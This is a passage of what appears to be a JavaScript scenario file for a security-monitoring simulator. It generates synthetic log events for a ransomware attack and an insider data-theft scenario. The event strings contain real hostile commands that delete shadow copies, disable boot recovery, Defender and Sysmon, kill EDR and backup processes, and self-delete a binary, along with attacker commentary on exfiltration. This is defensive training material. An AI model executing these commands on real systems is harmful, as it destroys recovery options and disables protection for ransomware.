                        { _time_offset: 310, host: 'WS-ALICE', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'SYSTEM', user: 'SYSTEM', process: 'vssadmin.exe', process_name: 'vssadmin.exe', parent_process: 'rundll32.exe', parent_process_name: 'rundll32.exe', command_line: 'vssadmin.exe delete shadows /all /quiet', mitre_technique: 'T1490', mitre_tactic: 'Impact', severity: 'critical', description: 'Volume shadow copies deleted via vssadmin', kill_chain_phase: 'defense_evasion', risk_score: 95, scenario_id: 'op_ironclaw' },
                        { _time_offset: 315, host: 'WS-ALICE', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'SYSTEM', user: 'SYSTEM', process: 'wmic.exe', process_name: 'wmic.exe', parent_process: 'rundll32.exe', parent_process_name: 'rundll32.exe', command_line: 'wmic.exe shadowcopy delete /nointeractive', mitre_technique: 'T1490', mitre_tactic: 'Impact', severity: 'critical', description: 'wmic shadowcopy delete', kill_chain_phase: 'defense_evasion', risk_score: 95, scenario_id: 'op_ironclaw' },
                        { _time_offset: 320, host: 'WS-ALICE', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'SYSTEM', user: 'SYSTEM', process: 'bcdedit.exe', process_name: 'bcdedit.exe', parent_process: 'rundll32.exe', parent_process_name: 'rundll32.exe', command_line: 'bcdedit /set {default} recoveryenabled No', mitre_technique: 'T1490', mitre_tactic: 'Impact', severity: 'critical', description: 'Boot recovery disabled', kill_chain_phase: 'defense_evasion', risk_score: 92, scenario_id: 'op_ironclaw' },
                        { _time_offset: 322, host: 'WS-ALICE', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'SYSTEM', user: 'SYSTEM', process: 'bcdedit.exe', process_name: 'bcdedit.exe', parent_process: 'rundll32.exe', parent_process_name: 'rundll32.exe', command_line: 'bcdedit /set {default} bootstatuspolicy ignoreallfailures', mitre_technique: 'T1490', mitre_tactic: 'Impact', severity: 'critical', description: 'Boot failure policy disabled', kill_chain_phase: 'defense_evasion', risk_score: 90, scenario_id: 'op_ironclaw' },
                        { _time_offset: 330, host: 'WS-ALICE', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'SYSTEM', user: 'SYSTEM', process: 'powershell.exe', process_name: 'powershell.exe', parent_process: 'rundll32.exe', parent_process_name: 'rundll32.exe', command_line: 'powershell -c Set-MpPreference -DisableRealtimeMonitoring $true', mitre_technique: 'T1562.001', mitre_tactic: 'Defense Evasion', severity: 'critical', description: 'Defender real-time protection disabled', kill_chain_phase: 'defense_evasion', risk_score: 90, scenario_id: 'op_ironclaw' },
                        { _time_offset: 335, host: 'WS-ALICE', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'SYSTEM', user: 'SYSTEM', process: 'powershell.exe', process_name: 'powershell.exe', parent_process: 'rundll32.exe', parent_process_name: 'rundll32.exe', command_line: 'powershell -c Add-MpPreference -ExclusionPath "C:\\"', mitre_technique: 'T1562.001', mitre_tactic: 'Defense Evasion', severity: 'high', description: 'Defender exclusion added for C:\\', kill_chain_phase: 'defense_evasion', risk_score: 85, scenario_id: 'op_ironclaw' },
                        { _time_offset: 345, host: 'WS-ALICE', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'SYSTEM', user: 'SYSTEM', process: 'net.exe', process_name: 'net.exe', parent_process: 'rundll32.exe', parent_process_name: 'rundll32.exe', command_line: 'net stop "Sysmon64"', mitre_technique: 'T1562.001', mitre_tactic: 'Defense Evasion', severity: 'critical', description: 'Sysmon service stopped', kill_chain_phase: 'defense_evasion', risk_score: 95, scenario_id: 'op_ironclaw' },
                        { _time_offset: 360, host: 'WS-ALICE', sourcetype: 'WinEventLog:Security', EventCode: 1102, src_user: 'SYSTEM', user: 'SYSTEM', mitre_technique: 'T1070.001', mitre_tactic: 'Defense Evasion', severity: 'high', description: 'Windows Security event log cleared', kill_chain_phase: 'defense_evasion', risk_score: 80, scenario_id: 'op_ironclaw' },
                        { _time_offset: 370, host: 'WS-ALICE', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'SYSTEM', user: 'SYSTEM', process: 'taskkill.exe', process_name: 'taskkill.exe', parent_process: 'rundll32.exe', parent_process_name: 'rundll32.exe', command_line: 'taskkill /F /IM veeam.backup.manager.exe', mitre_technique: 'T1489', mitre_tactic: 'Impact', severity: 'critical', description: 'Veeam backup process killed', kill_chain_phase: 'impact', risk_score: 92, scenario_id: 'op_ironclaw' },
                        { _time_offset: 372, host: 'WS-ALICE', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'SYSTEM', user: 'SYSTEM', process: 'taskkill.exe', process_name: 'taskkill.exe', parent_process: 'rundll32.exe', parent_process_name: 'rundll32.exe', command_line: 'taskkill /F /IM sqlservr.exe', mitre_technique: 'T1489', mitre_tactic: 'Impact', severity: 'high', description: 'SQL Server process killed to release file locks', kill_chain_phase: 'impact', risk_score: 80, scenario_id: 'op_ironclaw' },
                        { _time_offset: 376, host: 'WS-ALICE', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'SYSTEM', user: 'SYSTEM', process: 'taskkill.exe', process_name: 'taskkill.exe', parent_process: 'rundll32.exe', parent_process_name: 'rundll32.exe', command_line: 'taskkill /F /IM CarbonBlack.exe', mitre_technique: 'T1562.001', mitre_tactic: 'Defense Evasion', severity: 'critical', description: 'Carbon Black EDR agent killed', kill_chain_phase: 'defense_evasion', risk_score: 90, scenario_id: 'op_ironclaw' },
                        { _time_offset: 380, host: 'WS-ALICE', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'SYSTEM', user: 'SYSTEM', process: 'sc.exe', process_name: 'sc.exe', parent_process: 'rundll32.exe', parent_process_name: 'rundll32.exe', command_line: 'sc.exe config WinDefend start= disabled', mitre_technique: 'T1562.001', mitre_tactic: 'Defense Evasion', severity: 'high', description: 'WinDefend service set to disabled', kill_chain_phase: 'defense_evasion', risk_score: 80, scenario_id: 'op_ironclaw' },
                        { _time_offset: 390, host: 'WS-ALICE', sourcetype: 'attack_sim:notable', src_user: 'SYSTEM', user: 'SYSTEM', mitre_technique: 'T1490', mitre_tactic: 'Impact', severity: 'critical', description: 'NOTABLE: Recovery infrastructure disabled (VSS + Defender + Sysmon)', kill_chain_phase: 'defense_evasion', risk_score: 95, scenario_id: 'op_ironclaw' }
                    ]
                },
                // ============================================================
                // Phase 4 - Mass Encryption (T+10 to T+15min) -- ~20
                // ============================================================
                {
                    id: 'encryption',
                    label: 'Mass Encryption',
                    delay: 3,
                    transition_text: 'MASS FILE ENCRYPTION',
                    events: [
                        { _time_offset: 600, host: 'WS-ALICE', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'SYSTEM', user: 'SYSTEM', process: 'ransomware.exe', process_name: 'ransomware.exe', parent_process: 'rundll32.exe', parent_process_name: 'rundll32.exe', command_line: 'C:\\Users\\alice\\AppData\\Roaming\\msupdate\\ransomware.exe --encrypt', mitre_technique: 'T1486', mitre_tactic: 'Impact', severity: 'critical', description: 'Ransomware binary launched on WS-ALICE', kill_chain_phase: 'impact', risk_score: 100, scenario_id: 'op_ironclaw' },
                        { _time_offset: 605, host: 'WS-ALICE', sourcetype: 'WinEventLog:Sysmon', EventCode: 11, src_user: 'SYSTEM', user: 'SYSTEM', process: 'ransomware.exe', process_name: 'ransomware.exe', target_filename: 'C:\\Users\\alice\\Documents\\contract.docx.locked', file_name: 'contract.docx.locked', file_path: 'C:\\Users\\alice\\Documents', mitre_technique: 'T1486', mitre_tactic: 'Impact', severity: 'critical', description: 'File encrypted: contract.docx -> .locked', kill_chain_phase: 'impact', risk_score: 95, scenario_id: 'op_ironclaw' },
                        { _time_offset: 605, host: 'WS-ALICE', sourcetype: 'WinEventLog:Sysmon', EventCode: 11, src_user: 'SYSTEM', user: 'SYSTEM', process: 'ransomware.exe', process_name: 'ransomware.exe', target_filename: 'C:\\Users\\alice\\Documents\\Q4_forecast.xlsx.locked', file_name: 'Q4_forecast.xlsx.locked', file_path: 'C:\\Users\\alice\\Documents', mitre_technique: 'T1486', mitre_tactic: 'Impact', severity: 'critical', description: 'File encrypted: Q4_forecast.xlsx -> .locked', kill_chain_phase: 'impact', risk_score: 95, scenario_id: 'op_ironclaw' },
                        { _time_offset: 606, host: 'WS-ALICE', sourcetype: 'WinEventLog:Sysmon', EventCode: 11, src_user: 'SYSTEM', user: 'SYSTEM', process: 'ransomware.exe', process_name: 'ransomware.exe', target_filename: 'C:\\Users\\alice\\Documents\\customer_list.csv.locked', file_name: 'customer_list.csv.locked', file_path: 'C:\\Users\\alice\\Documents', mitre_technique: 'T1486', mitre_tactic: 'Impact', severity: 'critical', description: 'File encrypted: customer_list.csv -> .locked', kill_chain_phase: 'impact', risk_score: 95, scenario_id: 'op_ironclaw' },
                        { _time_offset: 606, host: 'WS-ALICE', sourcetype: 'WinEventLog:Sysmon', EventCode: 11, src_user: 'SYSTEM', user: 'SYSTEM', process: 'ransomware.exe', process_name: 'ransomware.exe', target_filename: 'C:\\Users\\alice\\Pictures\\family.jpg.locked', file_name: 'family.jpg.locked', file_path: 'C:\\Users\\alice\\Pictures', mitre_technique: 'T1486', mitre_tactic: 'Impact', severity: 'critical', description: 'File encrypted: family.jpg -> .locked', kill_chain_phase: 'impact', risk_score: 95, scenario_id: 'op_ironclaw' },
                        { _time_offset: 607, host: 'WS-ALICE', sourcetype: 'WinEventLog:Sysmon', EventCode: 11, src_user: 'SYSTEM', user: 'SYSTEM', process: 'ransomware.exe', process_name: 'ransomware.exe', target_filename: 'C:\\Users\\alice\\Desktop\\notes.txt.locked', file_name: 'notes.txt.locked', file_path: 'C:\\Users\\alice\\Desktop', mitre_technique: 'T1486', mitre_tactic: 'Impact', severity: 'critical', description: 'File encrypted: notes.txt -> .locked', kill_chain_phase: 'impact', risk_score: 95, scenario_id: 'op_ironclaw' },
                        { _time_offset: 608, host: 'WS-ALICE', sourcetype: 'WinEventLog:Sysmon', EventCode: 11, src_user: 'SYSTEM', user: 'SYSTEM', process: 'ransomware.exe', process_name: 'ransomware.exe', target_filename: 'C:\\Users\\alice\\Downloads\\proposal_v3.pdf.locked', file_name: 'proposal_v3.pdf.locked', file_path: 'C:\\Users\\alice\\Downloads', mitre_technique: 'T1486', mitre_tactic: 'Impact', severity: 'critical', description: 'File encrypted: proposal_v3.pdf -> .locked', kill_chain_phase: 'impact', risk_score: 95, scenario_id: 'op_ironclaw' },
                        { _time_offset: 612, host: 'WS-ALICE', sourcetype: 'WinEventLog:Sysmon', EventCode: 11, src_user: 'SYSTEM', user: 'SYSTEM', process: 'ransomware.exe', process_name: 'ransomware.exe', target_filename: 'C:\\Users\\alice\\Documents\\salary_review.docx.locked', file_name: 'salary_review.docx.locked', file_path: 'C:\\Users\\alice\\Documents', mitre_technique: 'T1486', mitre_tactic: 'Impact', severity: 'critical', description: 'File encrypted: salary_review.docx -> .locked', kill_chain_phase: 'impact', risk_score: 95, scenario_id: 'op_ironclaw' },
                        { _time_offset: 615, host: 'WS-BOB', sourcetype: 'WinEventLog:Sysmon', EventCode: 11, src_user: 'SYSTEM', user: 'SYSTEM', process: 'ransomware.exe', process_name: 'ransomware.exe', target_filename: 'C:\\Users\\bob\\Documents\\board_minutes.docx.locked', file_name: 'board_minutes.docx.locked', file_path: 'C:\\Users\\bob\\Documents', mitre_technique: 'T1486', mitre_tactic: 'Impact', severity: 'critical', description: 'File encrypted on WS-BOB: board_minutes.docx', kill_chain_phase: 'impact', risk_score: 95, scenario_id: 'op_ironclaw' },
                        { _time_offset: 616, host: 'WS-BOB', sourcetype: 'WinEventLog:Sysmon', EventCode: 11, src_user: 'SYSTEM', user: 'SYSTEM', process: 'ransomware.exe', process_name: 'ransomware.exe', target_filename: 'C:\\Users\\bob\\Documents\\HR_handbook.pdf.locked', file_name: 'HR_handbook.pdf.locked', file_path: 'C:\\Users\\bob\\Documents', mitre_technique: 'T1486', mitre_tactic: 'Impact', severity: 'critical', description: 'File encrypted on WS-BOB: HR_handbook.pdf', kill_chain_phase: 'impact', risk_score: 95, scenario_id: 'op_ironclaw' },
                        { _time_offset: 620, host: 'WS-CHARLIE', sourcetype: 'WinEventLog:Sysmon', EventCode: 11, src_user: 'SYSTEM', user: 'SYSTEM', process: 'ransomware.exe', process_name: 'ransomware.exe', target_filename: 'C:\\Users\\charlie\\Documents\\client_db.bak.locked', file_name: 'client_db.bak.locked', file_path: 'C:\\Users\\charlie\\Documents', mitre_technique: 'T1486', mitre_tactic: 'Impact', severity: 'critical', description: 'File encrypted on WS-CHARLIE: client_db.bak', kill_chain_phase: 'impact', risk_score: 95, scenario_id: 'op_ironclaw' },
                        { _time_offset: 624, host: 'WS-DIANA', sourcetype: 'WinEventLog:Sysmon', EventCode: 11, src_user: 'SYSTEM', user: 'SYSTEM', process: 'ransomware.exe', process_name: 'ransomware.exe', target_filename: 'C:\\Users\\diana\\Documents\\design_specs.docx.locked', file_name: 'design_specs.docx.locked', file_path: 'C:\\Users\\diana\\Documents', mitre_technique: 'T1486', mitre_tactic: 'Impact', severity: 'critical', description: 'File encrypted on WS-DIANA: design_specs.docx', kill_chain_phase: 'impact', risk_score: 95, scenario_id: 'op_ironclaw' },
                        { _time_offset: 630, host: 'SRV-FILE01', sourcetype: 'WinEventLog:Sysmon', EventCode: 11, src_user: 'SYSTEM', user: 'SYSTEM', process: 'ransomware.exe', process_name: 'ransomware.exe', target_filename: 'C:\\Shares\\Finance\\GL_2024.xlsx.locked', file_name: 'GL_2024.xlsx.locked', file_path: 'C:\\Shares\\Finance', mitre_technique: 'T1486', mitre_tactic: 'Impact', severity: 'critical', description: 'File encrypted on SRV-FILE01: GL_2024.xlsx', kill_chain_phase: 'impact', risk_score: 98, scenario_id: 'op_ironclaw' },
                        { _time_offset: 633, host: 'SRV-FILE01', sourcetype: 'WinEventLog:Sysmon', EventCode: 11, src_user: 'SYSTEM', user: 'SYSTEM', process: 'ransomware.exe', process_name: 'ransomware.exe', target_filename: 'C:\\Shares\\Finance\\AP_master.xlsx.locked', file_name: 'AP_master.xlsx.locked', file_path: 'C:\\Shares\\Finance', mitre_technique: 'T1486', mitre_tactic: 'Impact', severity: 'critical', description: 'File encrypted on SRV-FILE01: AP_master.xlsx', kill_chain_phase: 'impact', risk_score: 98, scenario_id: 'op_ironclaw' },
                        { _time_offset: 638, host: 'SRV-FILE01', sourcetype: 'WinEventLog:Sysmon', EventCode: 11, src_user: 'SYSTEM', user: 'SYSTEM', process: 'ransomware.exe', process_name: 'ransomware.exe', target_filename: 'C:\\Shares\\HR\\employees.csv.locked', file_name: 'employees.csv.locked', file_path: 'C:\\Shares\\HR', mitre_technique: 'T1486', mitre_tactic: 'Impact', severity: 'critical', description: 'File encrypted on SRV-FILE01: employees.csv', kill_chain_phase: 'impact', risk_score: 98, scenario_id: 'op_ironclaw' },
                        { _time_offset: 645, host: 'SRV-PRINT01', sourcetype: 'WinEventLog:Sysmon', EventCode: 11, src_user: 'SYSTEM', user: 'SYSTEM', process: 'ransomware.exe', process_name: 'ransomware.exe', target_filename: 'D:\\PrintQueue\\jobs.db.locked', file_name: 'jobs.db.locked', file_path: 'D:\\PrintQueue', mitre_technique: 'T1486', mitre_tactic: 'Impact', severity: 'high', description: 'File encrypted on SRV-PRINT01: jobs.db', kill_chain_phase: 'impact', risk_score: 90, scenario_id: 'op_ironclaw' },
                        { _time_offset: 660, host: 'WS-ALICE', sourcetype: 'WinEventLog:Sysmon', EventCode: 13, src_user: 'SYSTEM', user: 'SYSTEM', process: 'ransomware.exe', process_name: 'ransomware.exe', target_object: 'HKLM\\SOFTWARE\\Ironclaw\\PaymentAddr', mitre_technique: 'T1112', mitre_tactic: 'Defense Evasion', severity: 'medium', description: 'Registry modification: ransom payment address stored', kill_chain_phase: 'impact', risk_score: 60, scenario_id: 'op_ironclaw' },
                        { _time_offset: 700, host: 'WS-ALICE', sourcetype: 'attack_sim:notable', src_user: 'SYSTEM', user: 'SYSTEM', mitre_technique: 'T1486', mitre_tactic: 'Impact', severity: 'critical', description: 'NOTABLE: Mass file encryption detected (WS-ALICE)', kill_chain_phase: 'impact', risk_score: 100, scenario_id: 'op_ironclaw' },
                        { _time_offset: 720, host: 'SRV-FILE01', sourcetype: 'attack_sim:notable', src_user: 'SYSTEM', user: 'SYSTEM', mitre_technique: 'T1486', mitre_tactic: 'Impact', severity: 'critical', description: 'NOTABLE: Mass file encryption detected (SRV-FILE01)', kill_chain_phase: 'impact', risk_score: 100, scenario_id: 'op_ironclaw' }
                    ]
                },
                // ============================================================
                // Phase 5 - Ransom Note + C2 Beacon (T+15 to T+18min) -- ~10
                // ============================================================
                {
                    id: 'ransom_note',
                    label: 'Ransom Note & C2',
                    delay: 3,
                    transition_text: 'RANSOM NOTE + C2 BEACON',
                    events: [
                        { _time_offset: 900, host: 'WS-ALICE', sourcetype: 'WinEventLog:Sysmon', EventCode: 11, src_user: 'SYSTEM', user: 'SYSTEM', process: 'ransomware.exe', process_name: 'ransomware.exe', target_filename: 'C:\\Users\\alice\\Desktop\\!READ_ME_IRONCLAW!.txt', file_name: '!READ_ME_IRONCLAW!.txt', file_path: 'C:\\Users\\alice\\Desktop', mitre_technique: 'T1486', mitre_tactic: 'Impact', severity: 'high', description: 'Ransom note dropped to desktop', kill_chain_phase: 'impact', risk_score: 85, scenario_id: 'op_ironclaw' },
                        { _time_offset: 902, host: 'WS-BOB', sourcetype: 'WinEventLog:Sysmon', EventCode: 11, src_user: 'SYSTEM', user: 'SYSTEM', process: 'ransomware.exe', process_name: 'ransomware.exe', target_filename: 'C:\\Users\\bob\\Desktop\\!READ_ME_IRONCLAW!.txt', file_name: '!READ_ME_IRONCLAW!.txt', file_path: 'C:\\Users\\bob\\Desktop', mitre_technique: 'T1486', mitre_tactic: 'Impact', severity: 'high', description: 'Ransom note dropped on WS-BOB', kill_chain_phase: 'impact', risk_score: 85, scenario_id: 'op_ironclaw' },
                        { _time_offset: 905, host: 'WS-CHARLIE', sourcetype: 'WinEventLog:Sysmon', EventCode: 11, src_user: 'SYSTEM', user: 'SYSTEM', process: 'ransomware.exe', process_name: 'ransomware.exe', target_filename: 'C:\\Users\\charlie\\Desktop\\!READ_ME_IRONCLAW!.txt', file_name: '!READ_ME_IRONCLAW!.txt', file_path: 'C:\\Users\\charlie\\Desktop', mitre_technique: 'T1486', mitre_tactic: 'Impact', severity: 'high', description: 'Ransom note dropped on WS-CHARLIE', kill_chain_phase: 'impact', risk_score: 85, scenario_id: 'op_ironclaw' },
                        { _time_offset: 920, host: 'WS-ALICE', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'alice', user: 'alice', process: 'chrome.exe', process_name: 'chrome.exe', parent_process: 'ransomware.exe', parent_process_name: 'ransomware.exe', command_line: 'chrome.exe https://ironclaw3xq7t2z5.onion/pay/A8B4C9', mitre_technique: 'T1071.001', mitre_tactic: 'Command and Control', severity: 'high', description: 'Browser launched with .onion ransom payment URL', kill_chain_phase: 'c2', risk_score: 85, scenario_id: 'op_ironclaw' },
                        { _time_offset: 930, host: 'WS-ALICE', sourcetype: 'stream:tcp', src_ip: '10.2.5.21', src: '10.2.5.21', dest_ip: '185.130.44.91', dest: '185.130.44.91', dest_port: 9001, app: 'tor', bytes_out: 2048, bytes_in: 4096, bytes: 6144, mitre_technique: 'T1090.003', mitre_tactic: 'Command and Control', severity: 'high', description: 'Tor exit-node connection from WS-ALICE', kill_chain_phase: 'c2', risk_score: 80, scenario_id: 'op_ironclaw' },
                        { _time_offset: 940, host: 'WS-ALICE', sourcetype: 'stream:http', src_ip: '10.2.5.21', src: '10.2.5.21', dest_ip: '198.51.100.77', dest: '198.51.100.77', dest_port: 443, dest_host: 'invoice-acme-corp.net', site: 'invoice-acme-corp.net', http_method: 'POST', url: 'https://invoice-acme-corp.net/encryption-complete', uri_path: '/encryption-complete', bytes_out: 2048, bytes_in: 512, bytes: 2560, status: 200, app: 'https', mitre_technique: 'T1071.001', mitre_tactic: 'Command and Control', severity: 'high', description: 'C2 notified: encryption complete', kill_chain_phase: 'c2', risk_score: 80, scenario_id: 'op_ironclaw' },
                        { _time_offset: 960, host: 'WS-ALICE', sourcetype: 'WinEventLog:Sysmon', EventCode: 13, src_user: 'SYSTEM', user: 'SYSTEM', process: 'ransomware.exe', process_name: 'ransomware.exe', target_object: 'HKCU\\Control Panel\\Desktop\\Wallpaper', mitre_technique: 'T1491.001', mitre_tactic: 'Impact', severity: 'medium', description: 'Desktop wallpaper changed to ransom message', kill_chain_phase: 'impact', risk_score: 60, scenario_id: 'op_ironclaw' },
                        { _time_offset: 990, host: 'WS-ALICE', sourcetype: 'stream:tcp', src_ip: '10.2.5.21', src: '10.2.5.21', dest_ip: '185.130.44.91', dest: '185.130.44.91', dest_port: 9001, app: 'tor', bytes_out: 1024, bytes_in: 2048, bytes: 3072, mitre_technique: 'T1090.003', mitre_tactic: 'Command and Control', severity: 'medium', description: 'Tor beacon (sustained)', kill_chain_phase: 'c2', risk_score: 70, scenario_id: 'op_ironclaw' },
                        { _time_offset: 1020, host: 'WS-ALICE', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'SYSTEM', user: 'SYSTEM', process: 'cmd.exe', process_name: 'cmd.exe', parent_process: 'ransomware.exe', parent_process_name: 'ransomware.exe', command_line: 'cmd /c del /f /q C:\\Users\\alice\\AppData\\Roaming\\msupdate\\ransomware.exe', mitre_technique: 'T1070.004', mitre_tactic: 'Defense Evasion', severity: 'medium', description: 'Ransomware binary self-deletes', kill_chain_phase: 'defense_evasion', risk_score: 60, scenario_id: 'op_ironclaw' },
                        { _time_offset: 1060, host: 'WS-ALICE', sourcetype: 'attack_sim:notable', src_user: 'alice', user: 'alice', mitre_technique: 'T1090.003', mitre_tactic: 'Command and Control', severity: 'high', description: 'NOTABLE: Tor traffic + ransom note correlation', kill_chain_phase: 'c2', risk_score: 90, scenario_id: 'op_ironclaw' }
                    ]
                }
            ]
        },

        // ====================================================================
        // op_silent_drift - Insider Data Theft
        // 4 phases, ~50 events, simulated ~25min, target playback 90s
        // ====================================================================
        op_silent_drift: {
            id: 'op_silent_drift',
            attacker_thoughts: [
                { _time_offset: 60, text: 'Just browsing the wiki. Looking like a normal admin doing normal admin things.' },
                { _time_offset: 420, text: 'HR-SENSITIVE share mounted. I\'m not on the access list but it never blocks me.' },
                { _time_offset: 900, text: 'CRM dump 4.2GB. Customer records, contracts, the whole executive folder.' },
                { _time_offset: 1320, text: 'Zipping under user profile. Filename looks like a Windows update cache. Nobody\'ll check.' },
                { _time_offset: 1500, text: 'S3 sync to my personal bucket. Slow upload to look like routine backup traffic.' }
            ],
            name: 'Operation Silent Drift',
            subtitle: 'Insider exfiltrating customer + financial data over weeks',
            description: 'Privileged sysadmin j.miller, who normally only touches infra hosts, slowly drifts across boundaries: he browses internal wiki + HR-sensitive shares, runs direct SQL against the CRM database he does not own, stages compressed archives in his user profile, then uploads 800+ MB to personal cloud accounts (S3, Dropbox, Drive) using legitimate credentials.',
            duration_label: '~25min simulated',
            real_world: 'days-to-weeks (slow insider exfil)',
            target_playback_seconds: 90,
            phases: [
                // ============================================================
                // Phase 1 - Recon (T+0 to T+5min) -- ~10
                // ============================================================
                {
                    id: 'recon',
                    label: 'Recon',
                    delay: 0,
                    transition_text: 'INSIDER RECON',
                    events: [
                        { _time_offset: 0, host: 'WS-JMILLER', sourcetype: 'stream:http', src_ip: '10.3.7.55', src: '10.3.7.55', dest_ip: '10.3.20.10', dest: '10.3.20.10', dest_port: 443, dest_host: 'wiki.corp.local', site: 'wiki.corp.local', http_method: 'GET', url: 'https://wiki.corp.local/finance/QBR-Q4', uri_path: '/finance/QBR-Q4', bytes_out: 256, bytes_in: 81920, bytes: 82176, status: 200, app: 'https', src_user: 'j.miller', user: 'j.miller', mitre_technique: 'T1213', mitre_tactic: 'Collection', severity: 'low', description: 'j.miller browses internal finance QBR wiki page', kill_chain_phase: 'discovery', risk_score: 25, scenario_id: 'op_silent_drift' },
                        { _time_offset: 25, host: 'WS-JMILLER', sourcetype: 'stream:http', src_ip: '10.3.7.55', src: '10.3.7.55', dest_ip: '10.3.20.10', dest: '10.3.20.10', dest_port: 443, dest_host: 'wiki.corp.local', site: 'wiki.corp.local', http_method: 'GET', url: 'https://wiki.corp.local/hr/comp-bands', uri_path: '/hr/comp-bands', bytes_out: 256, bytes_in: 102400, bytes: 102656, status: 200, app: 'https', src_user: 'j.miller', user: 'j.miller', mitre_technique: 'T1213', mitre_tactic: 'Collection', severity: 'medium', description: 'j.miller browses HR compensation wiki page (outside role)', kill_chain_phase: 'discovery', risk_score: 45, scenario_id: 'op_silent_drift' },
                        { _time_offset: 55, host: 'WS-JMILLER', sourcetype: 'stream:http', src_ip: '10.3.7.55', src: '10.3.7.55', dest_ip: '10.3.20.11', dest: '10.3.20.11', dest_port: 443, dest_host: 'sharepoint.corp.local', site: 'sharepoint.corp.local', http_method: 'GET', url: 'https://sharepoint.corp.local/sites/exec/forecasts.aspx', uri_path: '/sites/exec/forecasts.aspx', bytes_out: 256, bytes_in: 152400, bytes: 152656, status: 200, app: 'https', src_user: 'j.miller', user: 'j.miller', mitre_technique: 'T1213.002', mitre_tactic: 'Collection', severity: 'medium', description: 'Executive SharePoint forecasts page accessed', kill_chain_phase: 'discovery', risk_score: 50, scenario_id: 'op_silent_drift' },
                        { _time_offset: 80, host: 'WS-JMILLER', sourcetype: 'stream:tcp', src_ip: '10.3.7.55', src: '10.3.7.55', dest_ip: '8.8.8.8', dest: '8.8.8.8', dest_port: 53, app: 'dns', bytes_out: 128, bytes_in: 256, bytes: 384, src_user: 'j.miller', user: 'j.miller', query: 'acme-personal.s3.amazonaws.com', mitre_technique: 'T1071.004', mitre_tactic: 'Command and Control', severity: 'low', description: 'DNS lookup: personal S3 bucket', kill_chain_phase: 'discovery', risk_score: 30, scenario_id: 'op_silent_drift' },
                        { _time_offset: 95, host: 'WS-JMILLER', sourcetype: 'stream:tcp', src_ip: '10.3.7.55', src: '10.3.7.55', dest_ip: '8.8.8.8', dest: '8.8.8.8', dest_port: 53, app: 'dns', bytes_out: 128, bytes_in: 256, bytes: 384, src_user: 'j.miller', user: 'j.miller', query: 'dropbox-jmiller.dropboxusercontent.com', mitre_technique: 'T1071.004', mitre_tactic: 'Command and Control', severity: 'low', description: 'DNS lookup: personal Dropbox', kill_chain_phase: 'discovery', risk_score: 30, scenario_id: 'op_silent_drift' },
                        { _time_offset: 130, host: 'WS-JMILLER', sourcetype: 'stream:http', src_ip: '10.3.7.55', src: '10.3.7.55', dest_ip: '10.3.20.10', dest: '10.3.20.10', dest_port: 443, dest_host: 'wiki.corp.local', site: 'wiki.corp.local', http_method: 'GET', url: 'https://wiki.corp.local/customer-list-master', uri_path: '/customer-list-master', bytes_out: 256, bytes_in: 204800, bytes: 205056, status: 200, app: 'https', src_user: 'j.miller', user: 'j.miller', mitre_technique: 'T1213', mitre_tactic: 'Collection', severity: 'medium', description: 'Master customer list wiki page accessed', kill_chain_phase: 'discovery', risk_score: 50, scenario_id: 'op_silent_drift' },
                        { _time_offset: 180, host: 'WS-JMILLER', sourcetype: 'stream:http', src_ip: '10.3.7.55', src: '10.3.7.55', dest_ip: '10.3.20.11', dest: '10.3.20.11', dest_port: 443, dest_host: 'sharepoint.corp.local', site: 'sharepoint.corp.local', http_method: 'GET', url: 'https://sharepoint.corp.local/_layouts/15/search.aspx?q=salary', uri_path: '/_layouts/15/search.aspx', bytes_out: 256, bytes_in: 65536, bytes: 65792, status: 200, app: 'https', src_user: 'j.miller', user: 'j.miller', mitre_technique: 'T1213.002', mitre_tactic: 'Collection', severity: 'medium', description: 'SharePoint search for "salary"', kill_chain_phase: 'discovery', risk_score: 55, scenario_id: 'op_silent_drift' },
                        { _time_offset: 220, host: 'WS-JMILLER', sourcetype: 'stream:http', src_ip: '10.3.7.55', src: '10.3.7.55', dest_ip: '10.3.20.11', dest: '10.3.20.11', dest_port: 443, dest_host: 'sharepoint.corp.local', site: 'sharepoint.corp.local', http_method: 'GET', url: 'https://sharepoint.corp.local/_layouts/15/search.aspx?q=customer+pii', uri_path: '/_layouts/15/search.aspx', bytes_out: 256, bytes_in: 71680, bytes: 71936, status: 200, app: 'https', src_user: 'j.miller', user: 'j.miller', mitre_technique: 'T1213.002', mitre_tactic: 'Collection', severity: 'medium', description: 'SharePoint search for "customer pii"', kill_chain_phase: 'discovery', risk_score: 55, scenario_id: 'op_silent_drift' },
                        { _time_offset: 260, host: 'WS-JMILLER', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'j.miller', user: 'j.miller', process: 'powershell.exe', process_name: 'powershell.exe', parent_process: 'explorer.exe', parent_process_name: 'explorer.exe', command_line: 'powershell -c "Get-SmbShare | Where-Object {$_.Description -like \'*HR*\' -or $_.Description -like \'*Finance*\'}"', mitre_technique: 'T1135', mitre_tactic: 'Discovery', severity: 'medium', description: 'Powershell SMB share enumeration filtered for HR/Finance', kill_chain_phase: 'discovery', risk_score: 50, scenario_id: 'op_silent_drift' },
                        { _time_offset: 290, host: 'WS-JMILLER', sourcetype: 'stream:tcp', src_ip: '10.3.7.55', src: '10.3.7.55', dest_ip: '8.8.8.8', dest: '8.8.8.8', dest_port: 53, app: 'dns', bytes_out: 128, bytes_in: 256, bytes: 384, src_user: 'j.miller', user: 'j.miller', query: 'drive.google.com', mitre_technique: 'T1071.004', mitre_tactic: 'Command and Control', severity: 'low', description: 'DNS lookup: Google Drive', kill_chain_phase: 'discovery', risk_score: 30, scenario_id: 'op_silent_drift' }
                    ]
                },
                // ============================================================
                // Phase 2 - Access Expansion (T+5 to T+12min) -- ~13
                // ============================================================
                {
                    id: 'access_expansion',
